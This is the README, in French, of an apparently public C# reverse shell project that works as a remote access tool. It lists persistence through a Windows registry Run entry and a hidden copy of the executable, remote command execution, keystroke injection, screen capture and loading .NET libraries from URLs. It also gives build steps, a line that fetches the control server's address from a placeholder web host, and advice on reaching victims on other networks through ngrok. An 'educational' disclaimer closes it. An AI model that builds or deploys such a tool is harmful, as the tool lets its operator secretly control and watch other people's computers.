# README.MD
### Description du projet

Ce projet est une démonstration d'une reverse shell écrite en C#. Il s'agit d'un outil puissant pour la gestion à distance des systèmes, utilisé à des fins éducatives et de recherche.

#### Points clés du code

1. Connexion réseau : Le code utilise la classe TcpClient pour établir une connexion réseau avec un serveur distant. L'adresse IP et le port du serveur sont récupérés à partir d'un serveur web distant.

2. Cryptographie : Pour assurer la sécurité des communications, le code utilise l'algorithme de hachage SHA256 et un chiffrement XOR ainsi que le chiffrement RSA Pour un chiffrement simple de bout en bout. Les clés sont régénérées à chaque itération pour augmenter la sécurité.

3. Gestion des commandes : Le code est capable de lire les commandes à partir du flux de sortie standard d'un processus et de les envoyer au serveur. Il peut également lire les commandes du serveur et les exécuter sur la machine locale.

4. Fonctionnalités supplémentaires : Le code comprend des fonctionnalités supplémentaires telles que l'envoi de frappes de clavier, l'affichage de boite de messages, l'exécution de commandes de manière asynchrone, la capture d'écran à distance et le chargement de librarie .NET à partir d'URL.

5. Persistante : Le code tente de rendre la reverse shell persistante en ajoutant une entrée au registre Windows pour exécuter le programme au démarrage de la session de l'utilisateur. Il copie également le fichier exécutable dans un répertoire caché.


#### Utilisation
Pour télécharger .Net 7.0 en version portable, voir ici : https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-7.0.306-windows-x64-binaries

lien directe : https://download.visualstudio.microsoft.com/download/pr/3c443568-43b0-40b1-bb5c-3a6d8cd31876/e7d6c5b176b1c985a5f972dbf2c721b3/dotnet-sdk-7.0.306-win-x64.zip

##### compiler le client : 
Pour commencer, changer l'url à ligne 158 de client\Program.cs
```
string ip_port = new WebClient().DownloadString("https://outofhere.example.repl.co/");  // replace by YOUR WebServer url
```
ensuite compilez le client avec dotnet.exe
```
dotnet.exe publish client.csproj
```
Le binaire en un seul fichier se trouve a l'emplacement suivant : 
```
client\bin\Debug\net7.0-windows\win-x64\publish
```
Puis publier le serveur : 
```
dotnet.exe publish server.csproj
```
Le binaire en un seul fichier se trouve a l'emplacement suivant : 
```
server\bin\Debug\net7.0-windows\win-x64\publish
```
Pour se connecter au serveur depuis un autre reseau que le client, je vous conseille d'utiliser le service de tunneling ngrok et d'ajouter l'addresse IP et le port sur un serveur web avec un domaine fixe (par exemple sur un repl HTML, CSS, JS sur https://replit.com)
// L'addresse IP et le port doivent êtres séparré par deux points uniquement
ex : 
```
1.2.3.4:8080
```
### Démonstration

#### Pour information, les vidéos ont été enregistrées sur la même machine avec la protection en temps réel activée [sans envoyer d'échantillons], mais c'est bien CLIENT.EXE qui effectue les actions.

##### - Reverse Shell Si vous ne le voyez pas : https://github.com/Olivier-true/revserse-shell/blob/main/reverse_shell.gif?raw=true
<img src="https://github.com/Olivier-true/revserse-shell/blob/main/reverse_shell.gif?raw=true">

##### MessageBox et SendKeys
Si vous ne le voyez pas : https://raw.githubusercontent.com/Olivier-true/revserse-shell/main/send_keys_and_msgb.gif
<img src="https://raw.githubusercontent.com/Olivier-true/revserse-shell/main/send_keys_and_msgb.gif">
Exemple de commande msgb>/Votre Message SKS>/Vos Clés

##### remote-desktop
#### voir dans le repositry : remote-desktop.gif
Pour démarrer le bureau à distance, exécutez server-remote-video.exe dans remote-video\server-remote-video\server\bin\Debug et exécutez la commande sur server.exe : remote-desktop>/:8081

#### Avertissement

Ce projet est publié à des fins éducatives et de recherche. L'auteur n'est pas responsable de toute utilisation abusive de cet outil.
